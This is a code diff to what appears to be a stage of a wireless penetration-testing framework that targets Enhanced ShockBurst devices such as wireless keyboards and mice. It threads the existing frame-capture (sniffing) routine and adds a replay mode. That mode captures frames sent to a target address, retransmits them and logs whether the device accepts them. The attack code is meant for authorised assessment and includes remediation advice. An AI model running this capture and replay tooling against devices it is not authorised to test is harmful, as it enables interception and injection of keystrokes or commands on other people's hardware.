@@ -21,6 +21,7 @@ Requires: RfStorm (nRF24L01+) dongle — nRF52840 ESB PTX not confirmed stable.
 from __future__ import annotations
 
 import math
+import threading
 import time
 
 from core.dongle import WhadDongle
@@ -61,6 +62,8 @@ def run(dongle: WhadDongle, engagement_id: str) -> None:
         _run_prx(dongle, engagement_id)
     elif mode == "ptx":
         _run_ptx(dongle, engagement_id)
+    elif mode == "replay":
+        _run_replay(dongle, engagement_id)
     else:
         log.info("[S18] Aborted by operator.")
 
@@ -95,46 +98,57 @@ def _run_prx(dongle: WhadDongle, engagement_id: str) -> None:
         log.warning(f"[S18][prx] PRX init/start failed: {type(exc).__name__}: {exc}")
         return
 
-    deadline = time.time() + config.ESB_PRX_TIMEOUT
-    try:
-        for pkt in receiver.stream():
-            if time.time() >= deadline:
-                break
-            ch = getattr(pkt, "channel", getattr(pkt, "rf_channel", "?"))
-            try:
-                raw = bytes(pkt)
-                payload = raw[5:] if len(raw) > 5 else raw
-                hex_data = payload.hex()
-                is_plain = _looks_plaintext(payload)
-                frames.append({
-                    "channel": ch,
-                    "payload_hex": hex_data[:48],
-                    "plaintext": is_plain,
-                    "length": len(payload),
-                })
-                log.info(
-                    f"[S18][prx] Frame on ch {ch}: {hex_data[:32]} "
-                    f"{'[PLAINTEXT]' if is_plain else ''}"
-                )
-                if is_plain:
-                    plaintext_count += 1
-            except Exception as exc:
-                log.debug(f"[S18][prx] Frame decode error: {exc}")
-    except Exception as exc:
-        log.debug(f"[S18][prx] stream error: {type(exc).__name__}: {exc}")
-    finally:
+    stop_event = threading.Event()
+
+    def _rx_thread():
         try:
-            receiver.stop()
-        except Exception:
-            pass
+            for pkt in receiver.stream():
+                if stop_event.is_set():
+                    return
+                ch = getattr(pkt, "channel", getattr(pkt, "rf_channel", "?"))
+                try:
+                    raw = bytes(pkt)
+                    payload = raw[5:] if len(raw) > 5 else raw
+                    hex_data = payload.hex()
+                    is_plain = _looks_plaintext(payload)
+                    frames.append({
+                        "channel": ch,
+                        "payload_hex": hex_data[:48],
+                        "plaintext": is_plain,
+                        "length": len(payload),
+                    })
+                    log.info(
+                        f"[S18][prx] Frame on ch {ch}: {hex_data[:32]} "
+                        f"{'[PLAINTEXT]' if is_plain else ''}"
+                    )
+                    if is_plain:
+                        plaintext_count[0] += 1
+                except Exception as exc:
+                    log.debug(f"[S18][prx] Frame decode error: {exc}")
+        except Exception as exc:
+            if not stop_event.is_set():
+                log.debug(f"[S18][prx] stream: {type(exc).__name__}: {exc}")
+
+    # Use mutable container so _rx_thread can update it
+    plaintext_count = [0]
+    t = threading.Thread(target=_rx_thread, daemon=True)
+    t.start()
+    t.join(timeout=config.ESB_PRX_TIMEOUT)
+    stop_event.set()
+    try:
+        receiver.stop()
+    except Exception:
+        pass
+    t.join(timeout=3.0)
+    plaintext_count_val = plaintext_count[0]
 
     log.info(
         f"[S18][prx] Captured {len(frames)} frame(s), "
-        f"{plaintext_count} with low entropy."
+        f"{plaintext_count_val} with low entropy."
     )
 
     if frames:
-        severity = "high" if plaintext_count > 0 else "medium"
+        severity = "high" if plaintext_count_val > 0 else "medium"
         finding = Finding(
             type="esb_prx_frames_captured",
             severity=severity,
@@ -143,9 +157,9 @@ def _run_prx(dongle: WhadDongle, engagement_id: str) -> None:
                 f"ESB PRX interception captured {len(frames)} frame(s) addressed to "
                 f"{target_addr}. "
                 + (
-                    f"{plaintext_count} frame(s) showed low-entropy content "
+                    f"{plaintext_count_val} frame(s) showed low-entropy content "
                     "consistent with unencrypted commands/data."
-                    if plaintext_count > 0
+                    if plaintext_count_val > 0
                     else "No low-entropy frames detected — may be encrypted."
                 )
             ),
@@ -157,7 +171,7 @@ def _run_prx(dongle: WhadDongle, engagement_id: str) -> None:
             evidence={
                 "target_address": target_addr,
                 "frames_captured": len(frames),
-                "plaintext_frames": plaintext_count,
+                "plaintext_frames": plaintext_count_val,
                 "samples": frames[:5],
                 "listen_duration_seconds": config.ESB_PRX_TIMEOUT,
             },
@@ -166,7 +180,7 @@ def _run_prx(dongle: WhadDongle, engagement_id: str) -> None:
         insert_finding(finding)
         log.info(f"FINDING [{severity}] esb_prx_frames_captured: {target_addr}")
 
-    _print_prx_summary(target_addr, frames, plaintext_count)
+    _print_prx_summary(target_addr, frames, plaintext_count_val)
 
 
 # ── PTX — Primary Transmitter ─────────────────────────────────────────────────
@@ -278,6 +292,135 @@ def _run_ptx(dongle: WhadDongle, engagement_id: str) -> None:
     _print_ptx_summary(target_addr, synced, inject_ok, ack_received, payload_bytes)
 
 
+
+def _run_replay(dongle: WhadDongle, engagement_id: str) -> None:
+    """PRX capture then PTX replay — tests for missing replay counter protection."""
+    target_addr = _prompt_esb_address("REPLAY — enter ESB device address")
+    if not target_addr:
+        log.info("[S18][replay] No address — aborted.")
+        return
+
+    max_frames = getattr(config, "ESB_REPLAY_FRAMES", 5)
+    log.info(
+        f"[S18][replay] Phase 1: PRX capture on {target_addr} "
+        f"(up to {max_frames} frames / {config.ESB_PRX_TIMEOUT}s) ..."
+    )
+
+    captured_payloads: list[bytes] = []
+    stop_cap = threading.Event()
+
+    try:
+        receiver = _EsbPRX(dongle.device)
+        receiver.address = target_addr
+        receiver.start()
+    except Exception as exc:
+        log.warning(f"[S18][replay] PRX init: {type(exc).__name__}: {exc}")
+        return
+
+    def _cap_thread():
+        try:
+            for pkt in receiver.stream():
+                if stop_cap.is_set():
+                    return
+                try:
+                    raw = bytes(pkt)
+                    payload = raw[5:] if len(raw) > 5 else raw
+                    if payload:
+                        captured_payloads.append(payload)
+                        log.info(
+                            f"[S18][replay] Captured {len(captured_payloads)}: "
+                            f"{payload.hex()[:32]}"
+                        )
+                except Exception:
+                    pass
+                if len(captured_payloads) >= max_frames:
+                    stop_cap.set()
+                    return
+        except Exception as exc:
+            if not stop_cap.is_set():
+                log.debug(f"[S18][replay] PRX: {exc}")
+
+    t = threading.Thread(target=_cap_thread, daemon=True)
+    t.start()
+    t.join(timeout=config.ESB_PRX_TIMEOUT)
+    stop_cap.set()
+    try:
+        receiver.stop()
+    except Exception:
+        pass
+    t.join(timeout=3.0)
+
+    if not captured_payloads:
+        log.info("[S18][replay] No frames captured — device out of range.")
+        return
+
+    log.info(f"[S18][replay] Captured {len(captured_payloads)}. Starting PTX replay ...")
+
+    replayed = 0
+    acked = 0
+    try:
+        transmitter = _EsbPTX(dongle.device)
+        transmitter.address = target_addr
+        try:
+            transmitter.synchronize()
+        except Exception as exc:
+            log.warning(f"[S18][replay] synchronize(): {exc}")
+            return
+        for payload in captured_payloads:
+            try:
+                result = transmitter.send_data(payload, waiting_ack=True)
+                replayed += 1
+                if result:
+                    acked += 1
+                    log.info(f"[S18][replay] ACK! {payload.hex()[:32]}")
+            except Exception as exc:
+                log.debug(f"[S18][replay] send_data: {exc}")
+    except Exception as exc:
+        log.warning(f"[S18][replay] PTX init: {type(exc).__name__}: {exc}")
+        return
+    finally:
+        try:
+            transmitter.stop()
+        except Exception:
+            pass
+
+    severity = "critical" if acked > 0 else "high"
+    insert_finding(Finding(
+        type="esb_replay_accepted",
+        severity=severity,
+        target_addr=target_addr,
+        description=(
+            f"ESB replay on {target_addr}: {len(captured_payloads)} captured, "
+            f"{replayed} replayed, {acked} ACKed. "
+            + (
+                "Receiver ACKed replayed frames — no replay protection."
+                if acked > 0
+                else "No ACK on replayed frames — possible replay counter present."
+            )
+        ),
+        remediation=(
+            "Add a monotonic per-frame counter validated at the receiver. "
+            "Use AES-128 CCM with a nonce to prevent replay even if counter wraps."
+        ),
+        evidence={
+            "target": target_addr, "captured": len(captured_payloads),
+            "replayed": replayed, "acked": acked,
+            "samples": [p.hex()[:32] for p in captured_payloads[:3]],
+        },
+        engagement_id=engagement_id,
+    ))
+    log.info(f"FINDING [{severity}] esb_replay_accepted: {target_addr}")
+    print("\n" + "─" * 76)
+    print("  STAGE 18 SUMMARY -- ESB Replay Attack")
+    print("─" * 76)
+    print(f"  Target           : {target_addr}")
+    print(f"  Frames captured  : {len(captured_payloads)}")
+    print(f"  Frames replayed  : {replayed}")
+    ack_str = "YES *** REPLAY VULN ***" if acked > 0 else "no"
+    print(f"  ACKed            : {acked}  {ack_str}")
+    print("─" * 76 + "\n")
+
+
 # ── Helpers ───────────────────────────────────────────────────────────────────
 
 def _entropy(data: bytes) -> float:
@@ -298,21 +441,24 @@ def _looks_plaintext(payload: bytes) -> bool:
 
 def _ask_mode() -> str:
     print("\n  Stage 18 — ESB PRX/PTX Active Attack:")
-    print("    [R]  PRX — listen as receiver, capture frames sent to a device address")
-    print("    [T]  PTX — synchronize to device, inject unauthenticated frames")
+    print("    [R]  PRX  — capture frames sent to a target address")
+    print("    [T]  PTX  — synchronize and inject unauthenticated frames")
+    print("    [Y]  REPLAY — PRX capture then PTX replay (tests replay vulnerability)")
     print("    [S]  Skip")
     while True:
         try:
-            c = input("  Select [R/T/S]: ").strip().upper()
+            c = input("  Select [R/T/Y/S]: ").strip().upper()
         except (KeyboardInterrupt, EOFError):
             return "skip"
-        if c in ("R",):
+        if c == "R":
             return "prx"
-        if c in ("T",):
+        if c == "T":
             return "ptx"
+        if c == "Y":
+            return "replay"
         if c in ("S", ""):
             return "skip"
-        print("  Please enter R, T, or S.")
+        print("  Please enter R, T, Y, or S.")
 
 
 def _prompt_esb_address(prompt: str) -> str | None:
